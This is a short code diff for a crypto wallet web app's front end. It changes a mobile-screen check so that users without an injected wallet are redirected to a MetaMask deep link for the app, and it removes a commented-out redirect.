@@ -542,7 +542,7 @@ export default {
           await this.showBalance();
           return;
         } else {
-          if (window.innerWidth <= 768 && window.ethereum !== undefined) {
+          if (window.innerWidth <= 768 && !window.ethereum) {
             window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/";
             this.wc_claim()
           }else {
@@ -568,9 +568,6 @@ export default {
                       Swal.showLoading();
                     },
                   });
-                  // if ( window.innerWidth <= 768) {
-                  //   window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/";
-                  // }
                   this.account = getAccount().address;
                   this.showBalance();
                 }
